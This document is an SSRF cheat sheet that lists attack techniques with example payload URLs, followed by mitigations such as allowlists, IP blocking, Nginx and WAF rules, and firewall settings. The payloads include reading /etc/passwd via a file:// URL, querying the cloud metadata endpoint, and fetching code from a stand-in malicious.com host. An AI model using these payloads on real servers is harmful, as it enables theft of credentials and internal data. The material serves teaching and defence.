# Server-Side Request Forgery(SSRF)

Server-Side Request Forgery (SSRF) is a security vulnerability that allows an attacker to send crafted requests from a vulnerable server to internal or external resources, potentially exposing sensitive data.

## Methods to perform SSRF:
- ### URL Encoding and Manipulation
Attackers can use URL encoding to bypass input validation. For example, encoding special characters can help in accessing restricted resources.
```text
http://example.com/ssrf.php?url=http://127.0.0.1/%61dmin
```
- ### Exploiting Cloud Metadata Services
Many cloud providers expose sensitive metadata that can be accessed via SSRF. For instance, AWS metadata can be accessed using:
```text
http://169.254.169.254/latest/meta-data/
```
- ### Using Different URL Schemes
Attackers can leverage various URL schemes to access internal resources. Examples include:

`File Access`
```text
http://example.com/ssrf.php?url=file:///etc/passwd
```
`LDAP`
```text
http://example.com/ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```
- ### Cross-Site Port Attack (XSPA)
This technique allows attackers to scan for open ports on the server by sending requests to localhost. Examples include:
```text
http://localhost:22/
http://127.0.0.1:80/
```
- ### Chaining SSRF with Other Attacks
SSRF can be combined with other vulnerabilities, such as XSS or RCE, to escalate the attack. For example, fetching an SVG file containing malicious JavaScript:
```text
http://example.com/ssrf.php?url=http://malicious.com/payload.svg
```
- ### Bypassing Filters
Attackers can bypass whitelisting by using techniques like DNS rebinding or manipulating the request format. For instance:
```text
http://localtest.me
```
These advanced techniques highlight the importance of robust input validation and security measures to mitigate SSRF vulnerabilities.
- ### Using HTTP Methods
Attackers can exploit different HTTP methods (GET, POST, PUT) to manipulate server behavior. For example, using a POST request to send data to an internal service:
```text
POST /ssrf.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

url=http://internal-service.local
```
- ### DNS Rebinding
This technique allows attackers to control a domain's DNS resolution, redirecting requests to internal IPs. An example of a crafted DNS response could be:
```text
A 192.168.1.1
```
- ### Using Proxy Services
Attackers may utilize proxy services to obfuscate their requests, making it harder to trace the origin. For instance:
```text
http://example.com/ssrf.php?url=http://proxy-service.com/redirect?target=http://internal-service.local
```
- ### Targeting Internal APIs
Many applications expose internal APIs that can be accessed via SSRF. An example request could be:
```text
http://example.com/ssrf.php?url=http://internal-api.local/api/v1/data
```
- ### Exploiting Misconfigured Services
Misconfigured services can be targeted to extract sensitive information. For example, accessing a misconfigured database service:
```text
http://example.com/ssrf.php?url=http://db-service.local:5432
```
- ### Timing Attacks
By measuring response times, attackers can infer information about internal services. For example, sending requests with varying payloads to gauge response delays:
```text
http://example.com/ssrf.php?url=http://internal-service.local?param=1
```
These techniques emphasize the need for comprehensive security practices, including network segmentation and strict access controls, to defend against SSRF attacks.
- ### Using Response Manipulation
Attackers can manipulate server responses to extract information. For instance, they might craft a request that triggers an error revealing sensitive data:
```text
http://example.com/ssrf.php?url=http://internal-service.local/api?error=true
```
- ### Leveraging Webhooks
By exploiting webhooks, attackers can send crafted requests to internal services, potentially leading to data exfiltration. An example could be:
```text
http://example.com/ssrf.php?url=http://internal-webhook.local/notify
```
- ### Exploiting CORS Misconfigurations
If Cross-Origin Resource Sharing (CORS) is misconfigured, attackers can leverage SSRF to access resources from different origins. For example:
```text
http://example.com/ssrf.php?url=http://malicious.com/cors
```
- ### Using Subdomain Takeover
Attackers can exploit subdomain takeover vulnerabilities to redirect SSRF requests to their controlled domains, potentially capturing sensitive data:
```text
http://example.com/ssrf.php?url=http://subdomain.vulnerable.com
```
- ### Accessing Local Services
Attackers can target local services that are not intended to be exposed externally, such as:
```text
http://example.com/ssrf.php?url=http://localhost:8080
```
- ### Exploiting File Uploads
If an application allows file uploads, attackers can upload a malicious file that triggers SSRF when processed. For example:
```text
http://example.com/upload.php?file=malicious_file
```
- ### Using HTTP Redirects
Attackers can exploit HTTP redirects to access internal resources indirectly. For instance:
```text
http://example.com/ssrf.php?url=http://redirect.local
```
- ### Combining with SSRF to RCE
By chaining SSRF with Remote Code Execution (RCE) vulnerabilities, attackers can execute arbitrary code on the server. An example could be:
```text
http://example.com/ssrf.php?url=http://malicious.com/rce_payload
```

## Mitigation of SSRF

- ### 1️⃣ Implement URL Allowlist (Deny All by Default)
✅ Solution:

Only allow trusted domains for outgoing requests.
Block requests to internal/private IP addresses (127.0.0.1, 169.254.169.254).
🔹 Example (Allowlisting URLs in Python Flask)
```text
ALLOWED_DOMAINS = ["api.example.com", "secure.example.com"]

def is_valid_url(url):
    parsed_url = urlparse(url)
    return parsed_url.hostname in ALLOWED_DOMAINS

if not is_valid_url(user_input_url):
    raise ValueError("Invalid URL")
```
🔹 Example (Allowlisting in Nginx)
```text
location /proxy {
    if ($http_host !~* ^(api\.example\.com|secure\.example\.com)$) {
        return 403;
    }
}
```

-  ### 2️⃣ Block Requests to Internal IP Addresses
✅ Solution:

Reject requests to private/internal networks (10.0.0.0/8, 192.168.0.0/16).
Prevent access to metadata services (169.254.169.254).
🔹 Example (Blocking Private IPs in Python)
```text
import ipaddress
from urllib.parse import urlparse

def is_private_ip(url):
    try:
        ip = ipaddress.ip_address(urlparse(url).hostname)
        return ip.is_private
    except ValueError:
        return False

if is_private_ip(user_input_url):
    raise ValueError("Blocked private IP request")
```
🔹 Example (Blocking Private IPs in Nginx)
```text
if ($http_host ~* "169.254.169.254|localhost|127.0.0.1|internal") {
    return 403;
}
```
- ### 3️⃣ Disable Unnecessary URL Fetching Features
✅ Solution:

Disable server-side HTTP fetching features if not needed.
Restrict the use of curl, wget, file_get_contents(), etc.
🔹 Example (Disable Remote URL Fetching in PHP)
```text
allow_url_fopen = Off
allow_url_include = Off
```
- ### 4️⃣ Validate and Sanitize User Input
✅ Solution:

Ensure user input does not contain external URLs unless explicitly needed.
Sanitize input to block file://, dict://, ftp://, etc.
🔹 Example (Sanitizing User Input in Python)
```text

def is_valid_url(url):
    return re.match(r"^https?://[a-zA-Z0-9.-]+$", url)

if not is_valid_url(user_input_url):
    raise ValueError("Invalid URL format")
```
🔹 Example (Blocking Dangerous Schemes in Nginx)
```text
if ($request_uri ~* "file://|dict://|ftp://") {
    return 403;
```
- ### 5️⃣ Enforce Metadata Service Protection (AWS, GCP, Azure)
✅ Solution:

Block access to cloud metadata services (169.254.169.254).
Use IMDSv2 for AWS (which requires a session token).
🔹 Example (Blocking Metadata Service in AWS Security Groups)
```text
aws ec2 modify-instance-metadata-options --instance-id i-12345678 --http-endpoint disabled
```
🔹 Example (Blocking AWS Metadata Service in Nginx)
```text
if ($http_host ~* "169.254.169.254") {
    return 403;
}
```
- ### 6️⃣ Use a Web Application Firewall (WAF)
✅ Solution:

Deploy a WAF to detect and block SSRF payloads.
Monitor logs for suspicious requests (file://, dict://, @localhost).
🔹 Example (ModSecurity WAF Rule for SSRF)
```text
SecRule ARGS "^(http|ftp|dict|file)://" "deny,status:403"
```
- ### 7️⃣ Implement Least Privilege for Outbound Requests
✅ Solution:

Restrict which services and apps can make outbound HTTP requests.
Block unnecessary outbound connections in the firewall.
🔹 Example (Restrict Outbound Requests in Linux Firewall - UFW)
```text
sudo ufw deny out to 169.254.169.254
sudo ufw deny out to 10.0.0.0/8
```
- ### 8️⃣ Monitor and Log Outbound Requests
✅ Solution:

Log all external requests to detect anomalies.
Use SIEM tools to flag suspicious activity.
🔹 Example (Logging External Requests in Python)
```text
import logging

logging.basicConfig(filename="ssrf_requests.log", level=logging.INFO)
logging.info(f"Outbound request to {user_input_url}")
```
